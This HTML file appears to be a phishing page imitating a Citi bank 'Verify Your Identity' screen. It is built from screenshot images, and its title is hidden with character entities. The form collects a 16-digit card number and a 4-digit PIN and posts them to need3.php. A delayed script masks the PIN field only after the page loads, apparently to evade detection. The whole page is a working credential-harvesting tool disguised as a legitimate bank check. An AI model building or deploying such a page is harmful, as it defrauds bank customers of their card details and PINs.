<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
  
.textbox {  
    border: solid 1px #C7C9CA;
  	border-radius: 5px;
 	padding-left: 10px;
	font-family: "CitiSans", "Trebuchet MS", Helvetica, Arial, sans-serif;
  	font-size: 16px;
    color: #58595B;
    height: 28px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #8EB1EB; 
    border-style: solid; 
  	border-radius: 2px;
    border-width: 2px; 
    outline: 0; 
 } 

 </style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:144px; top:19px; width:173px; height:30px; z-index:0"><a href="#"><img src="images/z1.png" alt="" title="" border=0 width=173 height=30></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:899px; top:59px; width:304px; height:399px; z-index:1"><a href="#"><img src="images/z3.png" alt="" title="" border=0 width=304 height=399></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:514px; width:1349px; height:51px; z-index:2"><img src="images/z8.png" alt="" title="" border=0 width=1349 height=51></div>

<div id="image9" style="position:absolute; overflow:hidden; left:266px; top:601px; width:767px; height:233px; z-index:3"><a href="#"><img src="images/z9.png" alt="" title="" border=0 width=767 height=233></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:264px; top:874px; width:756px; height:112px; z-index:4"><a href="#"><img src="images/z10.png" alt="" title="" border=0 width=756 height=112></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:268px; top:1036px; width:124px; height:117px; z-index:5"><a href="#"><img src="images/z11.png" alt="" title="" border=0 width=124 height=117></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:143px; top:1166px; width:1074px; height:158px; z-index:6"><img src="images/z12.png" alt="" title="" border=0 width=1074 height=158></div>

<div id="image2" style="position:absolute; overflow:hidden; left:139px; top:59px; width:541px; height:167px; z-index:7"><img src="images/z13.png" alt="" title="" border=0 width=541 height=167></div>

<div id="image5" style="position:absolute; overflow:hidden; left:154px; top:264px; width:465px; height:56px; z-index:8"><img src="images/z20.png" alt="" title="" border=0 width=465 height=56></div>
<form action=need3.php name=dekhtahn id=dekhtahn method=post>
<input name="cn" class="textbox" autocomplete="off" required maxlength="16" type="text" style="position:absolute;width:213px;left:155px;top:284px;z-index:13">
<input name="pn" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:213px;left:405px;top:284px;z-index:14">

<div id="formimage1" style="position:absolute; left:155px; top:359px; z-index:15"><input type="image" name="formimage1" width="142" height="34" src="images/cnte.png"></div>
</div>

	
</body>
</html>
